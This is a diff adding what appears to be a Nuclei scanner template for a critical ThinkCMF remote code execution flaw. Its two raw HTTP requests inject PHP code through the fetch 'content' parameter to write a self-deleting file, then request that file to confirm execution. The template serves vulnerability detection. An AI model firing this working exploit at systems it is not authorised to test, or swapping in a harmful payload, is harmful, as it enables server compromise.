@@ -1,0 +1,35 @@
+http:
+- matchers:
+  - part: body_2
+    type: word
+    words:
+    - '{{md5(string)}}'
+  raw:
+  - 'GET /index.php?a=fetch&content={{url_encode(''<?php file_put_contents(\"{{randstr}}.php\",\"<?php
+    echo md5(\"{{string}}\");unlink(__FILE__);\");'')}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+  - 'GET /{{randstr}}.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: thinkcmf-rce
+info:
+  author: pikpikcu
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  description: ThinkCMF  is susceptible to a remote code execution vulnerability.
+  metadata:
+    max-request: 2
+  name: ThinkCMF - Remote Code Execution
+  reference:
+  - https://www.freebuf.com/vuls/217586.html
+  severity: critical
+  tags: thinkcmf,rce,intrusive,vuln
+variables:
+  string: thinkcmf-rce
